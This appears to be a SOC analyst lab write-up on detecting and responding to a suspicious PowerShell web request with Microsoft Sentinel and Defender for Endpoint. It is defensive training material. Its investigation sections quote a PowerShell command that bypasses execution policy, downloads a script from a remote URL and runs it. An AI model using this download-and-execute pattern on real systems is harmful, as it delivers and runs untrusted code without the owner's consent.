# 🛡️ PowerShell Suspicious Web Request Detection & Incident Response
### SOC Analyst Project | Microsoft Sentinel & Defender for Endpoint
---
## 🛡️ Objective
- Threat actors who gain access to a system often leverage built-in tools such as PowerShell to download additional payloads from the internet. This technique allows attackers to blend into legitimate administrative activity while expanding control, establishing persistence, or communicating with command-and-control (C2) infrastructure.
- The objective of this project was to:
- Detect suspicious PowerShell web requests using Microsoft Sentinel
- Trigger and investigate an incident generated from this behavior
- Respond to and close the incident following the NIST 800-61 Incident Response Lifecycle

  <img width="650" height="300" alt="image" src="https://github.com/user-attachments/assets/86b36fba-7284-4f11-b573-d0daba6a3186" />




---
## 🎯 Environment & Tools
- Azure Virtual Machine (Windows)
- Microsoft Defender for Endpoint (MDE)
- Microsoft Sentinel (SIEM)
- Log Analytics Workspace
- PowerShell
- MITRE ATT&CK Framework

---

## 🎯 Threat Scenario Overview

- During post-exploitation activity, an attacker may use PowerShell commands such as Invoke-WebRequest to download scripts or binaries directly from external servers. These scripts may be    executed immediately or staged for later use.

- This behavior is commonly associated with:
- Malware deployment
- Credential harvesting
- Data exfiltration
- C2 communication
- Detecting PowerShell-driven downloads is critical for identifying active compromise.

---

## 🎯 Part 1: Detection Rule – Sentinel Analytic Rule
- Detection Logic
- A Scheduled Query Rule was created in Microsoft Sentinel to detect PowerShell processes executing web download commands.


#### ** Sample Query **

<img width="800" height="350" alt="image" src="https://github.com/user-attachments/assets/f62960e7-ba1b-45c2-94f8-4bbc7fac2c18" />

---

## 🎯 Part 2: Alert & Incident Creation

Once the detection rule is enabled, suspicious PowerShell activity was generated on the VM.
This resulted in a Sentinel incident titled: “PowerShell Suspicious Web Request”


<img width="700" height="300" alt="image" src="https://github.com/user-attachments/assets/5b0be281-284a-4daa-8c27-dcb5288e04be" />

---

## 🎯 Part 3: Detection & Analysis


#### 🔥  Identify and validate the incident 🔥 
- I Observe the incident and assign it to myself, set the status to Active.
- Investigate the Incident by Actions → Investigate (sometimes takes time for entities to appear)


<img width="900" height="300" alt="image" src="https://github.com/user-attachments/assets/2f70f206-ea85-46b9-a449-08337c583431" />

#### 🔥 Gather relevant evidence and assess impact 🔥 
  - In this case the actual script files would be evidence, but are not necessarily the threat. The threat would be how they got there in the first place, or why the user (or system            account) is downloading them and executing them.
  - In real life, this could have happened from accidentally downloading malware or installing a game or free software or any number of ways.
  
#### ** Notes: For the lab, let’s pretend like I contacted the user and they said they recently installed a free software at the same time the events took place. (But the reality is in this case, the attack simulator downloaded the scripts and executed them.



- #### 🔥  Entities (3)
 - Device: soclab1
 - User: soclab1
 - "powershell.exe" -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.gitxxxusercontent.com/josxxxdakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/     eicar.ps1 -OutFile C:\programdata\eicar.ps1


   
#### 🔥 Investigation evidence:

<img width="850" height="350" alt="image" src="https://github.com/user-attachments/assets/6e68b4ec-a2f0-4cf4-8b81-b497c58165e0" />


#### 🔥 Findings

- Upon investigating the triggered incident "Soclab1 - Suspicious Powershell Invoke-WebRequest"
- It was discovered that the following powershell script "powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://raw.gitxxxusercontent[.]com/josxxxadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1' -OutFile 'C:\programdata\eicar[.]ps1';
powershell.exe -ExecutionPolicy Bypass -File 'C:\programdata\eicar.ps1';
" was run on the device :Soclab1"


The incident was triggered on one device  "Soclab" by one user account "Soclab1"
PowerShell was used to download malicious script "eicar.ps1" from external URLs: https://raw.gxxxubusercontent[.]com/joshxxxdakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar[.]ps1


#### 🔥 Execution Review

- I checked to make sure none of the downloaded scripts were actually executed, but found out the script run successfuly.
- In this lab, scripts were executed by the attack simulator. In a real-world scenario, further root cause analysis would be required.

  
#### 🔥 Investigation Evidence 
<img width="850" height="300" alt="image" src="https://github.com/user-attachments/assets/d850df93-b91e-4f3a-b92d-75196b54fb89" />

---

## 🎯 Containment, Eradication, and Recovery

- Affected machine was isolated in Microsoft Defender for Endpoint
- Network communication restricted


  <img width="750" height="330" alt="image" src="https://github.com/user-attachments/assets/a0382c46-0950-46f5-8103-e620a8d685cf" />


### 🔥 Eradication

- Anti-malware scan initiated from MDE
- Downloaded scripts reviewed to determine execution status

### 🔥 Recovery

- No persistent malware identified
- System restored to normal operation
- Isolation lifted after verification
  
---
## 🎯 Post-Incident Activities

- Incident notes documented in Sentinel
- Lessons learned recorded


#### 🎯 Recommendations identified:

- Restrict PowerShell usage via policy
- Enhance endpoint attack surface reduction rules

---
## 🎯 Closure

- Incident reviewed and validated
- Classification: True Positive
- Incident closed in Microsoft Sentinel





